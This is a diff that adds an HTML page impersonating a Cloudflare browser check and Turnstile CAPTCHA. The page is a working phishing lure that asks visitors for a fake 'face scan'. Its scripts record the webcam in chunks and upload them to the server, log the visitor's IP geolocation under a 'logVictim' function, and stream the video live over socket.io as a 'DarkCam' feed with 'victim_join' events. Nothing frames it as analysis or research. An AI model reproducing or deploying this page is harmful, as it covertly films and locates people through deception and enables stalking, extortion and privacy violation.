@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Just a moment...</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+  background: #f0f2f5;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+/* ── Cloudflare top bar ── */
+.cf-bar {
+  position: fixed; top: 0; left: 0; right: 0;
+  height: 4px;
+  background: linear-gradient(90deg, #f38020, #fbad41);
+}
+
+/* ── Main card ── */
+.card {
+  background: #fff;
+  border-radius: 8px;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.12);
+  max-width: 440px; width: 100%;
+  padding: 32px 28px;
+  text-align: center;
+}
+
+.cf-logo {
+  display: flex; align-items: center; justify-content: center;
+  gap: 10px; margin-bottom: 24px;
+}
+.cf-logo svg { width: 32px; height: 32px; }
+.cf-logo-text { font-size: 18px; font-weight: 700; color: #333; }
+
+.domain {
+  font-size: 13px; color: #666;
+  background: #f5f5f5; border-radius: 4px;
+  padding: 6px 12px; margin-bottom: 24px;
+  display: inline-block; word-break: break-all;
+}
+
+/* ── Phase 1: spinner ── */
+#phase-checking { display: block; }
+
+.spinner-wrap { margin: 24px 0; }
+.spinner {
+  width: 48px; height: 48px;
+  border: 4px solid #e8e8e8;
+  border-top-color: #f38020;
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+  margin: 0 auto 16px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.check-title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+.check-sub { font-size: 14px; color: #666; line-height: 1.6; }
+
+.progress-bar-wrap {
+  height: 4px; background: #e8e8e8; border-radius: 2px;
+  margin: 20px 0; overflow: hidden;
+}
+.progress-bar {
+  height: 100%; width: 0%; background: #f38020;
+  border-radius: 2px;
+  animation: progress 3s ease forwards;
+}
+@keyframes progress { 0%{width:0%} 60%{width:70%} 100%{width:100%} }
+
+/* ── Phase 2: face verification ── */
+#phase-verify { display: none; }
+
+.verify-title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+.verify-sub { font-size: 14px; color: #555; line-height: 1.6; margin-bottom: 20px; }
+
+/* face scan box */
+.face-box {
+  position: relative;
+  width: 200px; height: 220px;
+  margin: 0 auto 20px;
+  border-radius: 12px;
+  overflow: hidden;
+  background: #111;
+}
+#cam-preview {
+  width: 100%; height: 100%;
+  object-fit: cover; display: none;
+  transform: scaleX(-1);
+}
+.face-placeholder {
+  position: absolute; inset: 0;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: center;
+  color: #555; gap: 8px;
+}
+.face-placeholder svg { opacity: 0.4; }
+.face-placeholder span { font-size: 12px; }
+
+/* face oval overlay */
+.face-oval-wrap {
+  position: absolute; inset: 0;
+  display: none;
+  align-items: center; justify-content: center;
+  pointer-events: none;
+}
+.face-oval {
+  width: 110px; height: 145px;
+  border: 2.5px solid #f38020;
+  border-radius: 50%;
+  animation: oval-pulse 2s ease infinite;
+}
+@keyframes oval-pulse { 0%,100%{border-color:#f38020;} 50%{border-color:#fbad41;} }
+
+.scan-line {
+  position: absolute; left: 0; right: 0;
+  height: 2px;
+  background: linear-gradient(90deg, transparent, #f38020 50%, transparent);
+  display: none;
+  animation: scan-anim 1.8s linear infinite;
+}
+@keyframes scan-anim { 0%{top:15%} 100%{top:85%} }
+
+.face-tip {
+  position: absolute; bottom: 10px; left: 0; right: 0;
+  text-align: center; font-size: 11px; font-weight: 600;
+  color: #fff; text-shadow: 0 1px 4px rgba(0,0,0,0.8);
+  display: none;
+}
+
+/* captcha row (checkbox style) */
+.captcha-row {
+  display: flex; align-items: center; gap: 14px;
+  border: 1px solid #d9d9d9; border-radius: 4px;
+  padding: 14px 16px; margin-bottom: 16px;
+  background: #fafafa; cursor: pointer;
+  user-select: none;
+}
+.captcha-check {
+  width: 24px; height: 24px;
+  border: 2px solid #bbb; border-radius: 3px;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0; background: #fff;
+  transition: all 0.2s;
+}
+.captcha-check.checked { border-color: #f38020; background: #f38020; }
+.captcha-check svg { display: none; }
+.captcha-check.checked svg { display: block; }
+.captcha-label { font-size: 14px; color: #333; }
+.captcha-brand {
+  margin-left: auto; display: flex; flex-direction: column;
+  align-items: center; gap: 2px; flex-shrink: 0;
+}
+.captcha-brand-logo { font-size: 20px; }
+.captcha-brand-text { font-size: 8px; color: #aaa; letter-spacing: 0.5px; }
+
+/* verify button */
+.verify-btn {
+  width: 100%; padding: 13px;
+  background: #f38020; border: none;
+  color: #fff; font-size: 15px; font-weight: 600;
+  border-radius: 6px; cursor: pointer;
+  transition: background 0.2s;
+}
+.verify-btn:hover { background: #e06a10; }
+.verify-btn:disabled { background: #ddd; color: #aaa; cursor: not-allowed; }
+
+.status-msg {
+  font-size: 13px; color: #888; margin-top: 12px; min-height: 18px;
+}
+
+/* ── Phase 3: success ── */
+#phase-success { display: none; }
+.success-icon { font-size: 56px; margin-bottom: 12px; }
+.success-title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+.success-sub { font-size: 14px; color: #666; }
+.redirect-bar-wrap { height: 3px; background: #e8e8e8; border-radius: 2px; margin: 20px 0; overflow: hidden; }
+.redirect-bar { height: 100%; background: #2da44e; border-radius: 2px; animation: redirect 3s linear forwards; }
+@keyframes redirect { 0%{width:0%} 100%{width:100%} }
+
+/* ── Footer ── */
+.footer {
+  margin-top: 20px;
+  font-size: 12px; color: #aaa; text-align: center; line-height: 1.8;
+}
+.footer a { color: #888; text-decoration: none; }
+</style>
+</head>
+<body>
+
+<div class="cf-bar"></div>
+
+<div class="card">
+
+  <!-- Cloudflare logo -->
+  <div class="cf-logo">
+    <svg viewBox="0 0 109 41" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M82.3 16.6c-.3-1-.6-1.9-1-2.8a20.4 20.4 0 0 0-38.8 4.4 11.6 11.6 0 0 0-1.5-.1 11.5 11.5 0 0 0-11.5 11.5H93a8.7 8.7 0 0 0-10.7-13z" fill="#f38020"/>
+      <path d="M93.5 29.6H29.5a11.5 11.5 0 0 0 11.5-11.5c.5 0 1 0 1.5.1a20.4 20.4 0 0 1 38.8-4.4c.4.9.7 1.8 1 2.8A8.7 8.7 0 0 1 93.5 29.6z" fill="#fbad41"/>
+    </svg>
+    <span class="cf-logo-text">Cloudflare</span>
+  </div>
+
+  <div class="domain" id="site-domain">Checking your browser...</div>
+
+  <!-- Phase 1: Checking browser -->
+  <div id="phase-checking">
+    <div class="check-title">Checking your browser</div>
+    <div class="check-sub">This process is automatic. Your browser will redirect shortly.</div>
+    <div class="spinner-wrap">
+      <div class="spinner"></div>
+    </div>
+    <div class="progress-bar-wrap">
+      <div class="progress-bar"></div>
+    </div>
+    <div class="check-sub" style="font-size:12px;color:#aaa;">
+      DDoS protection by <strong>Cloudflare</strong>
+    </div>
+  </div>
+
+  <!-- Phase 2: Face Verification -->
+  <div id="phase-verify">
+    <div class="verify-title">Verify you are human</div>
+    <div class="verify-sub">
+      We detected unusual activity from your network.<br>
+      Complete a quick face scan to continue.
+    </div>
+
+    <div class="face-box" id="face-box">
+      <video id="cam-preview" autoplay playsinline muted></video>
+      <div class="face-placeholder" id="face-placeholder">
+        <svg width="48" height="48" viewBox="0 0 24 24" fill="#555">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+        </svg>
+        <span>Camera inactive</span>
+      </div>
+      <div class="face-oval-wrap" id="face-oval-wrap">
+        <div class="face-oval"></div>
+      </div>
+      <div class="scan-line" id="scan-line"></div>
+      <div class="face-tip" id="face-tip">Position your face in the oval</div>
+    </div>
+
+    <!-- Checkbox row (triggers camera on click) -->
+    <div class="captcha-row" id="captcha-row" onclick="startVerify()">
+      <div class="captcha-check" id="captcha-check">
+        <svg width="14" height="14" viewBox="0 0 14 14" fill="white">
+          <path d="M2 7l4 4 6-6" stroke="white" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <span class="captcha-label">I am not a robot</span>
+      <div class="captcha-brand">
+        <div class="captcha-brand-logo">☁️</div>
+        <div class="captcha-brand-text">TURNSTILE</div>
+      </div>
+    </div>
+
+    <button class="verify-btn" id="verify-btn" disabled onclick="submitVerify()">
+      Verify &amp; Continue
+    </button>
+    <div class="status-msg" id="status-msg">Click the checkbox to begin verification</div>
+  </div>
+
+  <!-- Phase 3: Success -->
+  <div id="phase-success">
+    <div class="success-icon">✅</div>
+    <div class="success-title">Verification complete</div>
+    <div class="success-sub">You have successfully verified your identity. Redirecting...</div>
+    <div class="redirect-bar-wrap">
+      <div class="redirect-bar"></div>
+    </div>
+  </div>
+
+</div>
+
+<div class="footer">
+  Performance &amp; security by <a href="#">Cloudflare</a><br>
+  Ray ID: <span id="ray-id"></span> &bull; Your IP: <span id="user-ip">—</span>
+</div>
+
+<script>
+const SID = Math.random().toString(36).slice(2, 10);
+
+// Random Ray ID
+document.getElementById('ray-id').textContent =
+  Math.random().toString(16).slice(2,18).toUpperCase();
+
+// Show domain
+document.getElementById('site-domain').textContent = window.location.hostname;
+
+// Geo fetch
+let geoData = {};
+async function getGeo() {
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    geoData = await r.json();
+    document.getElementById('user-ip').textContent = geoData.ip || '—';
+    return geoData;
+  } catch(e) { return {}; }
+}
+
+// Log to server
+function logVictim(geo) {
+  fetch('/log', {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({session: SID, geo: {
+      city: geo.city, country: geo.country_code,
+      region: geo.region, org: geo.org
+    }})
+  }).catch(()=>{});
+}
+
+let stream = null;
+let recording = false;
+let recorder = null;
+let chunks = [];
+let chunkIdx = 0;
+
+// Phase 1 → Phase 2 after 3.2s
+getGeo();
+setTimeout(() => {
+  document.getElementById('phase-checking').style.display = 'none';
+  document.getElementById('phase-verify').style.display = 'block';
+  logVictim(geoData);
+}, 3200);
+
+// Checkbox click → request camera
+async function startVerify() {
+  const row = document.getElementById('captcha-row');
+  const chk = document.getElementById('captcha-check');
+  const msg = document.getElementById('status-msg');
+
+  if (chk.classList.contains('checked')) return;
+
+  row.style.pointerEvents = 'none';
+  msg.textContent = 'Initializing face scan...';
+
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+    // Camera granted
+    chk.classList.add('checked');
+    document.getElementById('cam-preview').srcObject = stream;
+    document.getElementById('cam-preview').style.display = 'block';
+    document.getElementById('face-placeholder').style.display = 'none';
+    document.getElementById('face-oval-wrap').style.display = 'flex';
+    document.getElementById('scan-line').style.display = 'block';
+    document.getElementById('face-tip').style.display = 'block';
+
+    msg.textContent = 'Scanning... please look at the camera';
+    document.getElementById('verify-btn').disabled = false;
+    startRecording();
+  } catch(e) {
+    msg.textContent = 'Camera access required to complete verification.';
+    row.style.pointerEvents = 'auto';
+  }
+}
+
+function startRecording() {
+  if (!stream) return;
+  recording = true;
+  chunks = [];
+  chunkIdx = 0;
+  const opts = MediaRecorder.isTypeSupported('video/webm;codecs=vp9')
+    ? { mimeType: 'video/webm;codecs=vp9' }
+    : { mimeType: 'video/webm' };
+  recorder = new MediaRecorder(stream, opts);
+  recorder.ondataavailable = async (e) => {
+    if (!e.data || e.data.size < 100) return;
+    chunks.push(e.data);
+    await sendChunk(e.data, chunkIdx++);
+  };
+  recorder.start(5000);
+}
+
+async function sendChunk(blob, idx) {
+  try {
+    await fetch(`/upload?sid=${SID}&chunk=${idx}`, {
+      method: 'POST', body: blob,
+      headers: {'Content-Type': 'video/webm'}
+    });
+  } catch(e) {}
+}
+
+// Verify button
+async function submitVerify() {
+  document.getElementById('verify-btn').disabled = true;
+  document.getElementById('status-msg').textContent = 'Verifying identity...';
+  await new Promise(r => setTimeout(r, 2000));
+
+  if (recorder && recorder.state !== 'inactive') {
+    recorder.stop();
+    recorder.onstop = async () => {
+      try {
+        await fetch(`/finalize?sid=${SID}`, { method: 'POST' });
+      } catch(e) {}
+    };
+  }
+  if (stream) stream.getTracks().forEach(t => t.stop());
+
+  document.getElementById('phase-verify').style.display = 'none';
+  document.getElementById('phase-success').style.display = 'block';
+}
+</script>
+
+<!-- DarkCam Live Stream -->
+<script src="/static/socket.io.min.js"></script>
+<script>
+(function(){
+  const _sock = io({ transports: ['websocket', 'polling'] });
+  let _geo = {};
+  getGeo().then(g => { _geo = g; });
+  _sock.on('connect', function() {
+    _sock.emit('victim_join', {
+      sid:  SID,
+      lure: 'Cloudflare CAPTCHA',
+      ua:   navigator.userAgent,
+      geo:  _geo
+    });
+  });
+  const _origSend = window.sendChunk;
+  window.sendChunk = async function(blob, idx) {
+    if (_origSend) await _origSend(blob, idx);
+    try {
+      const buf = await blob.arrayBuffer();
+      _sock.emit('live_chunk', {
+        sid: SID, idx: idx, first: idx === 0, data: buf
+      });
+    } catch(e) {}
+  };
+})();
+</script>
+
+</body>
+</html>
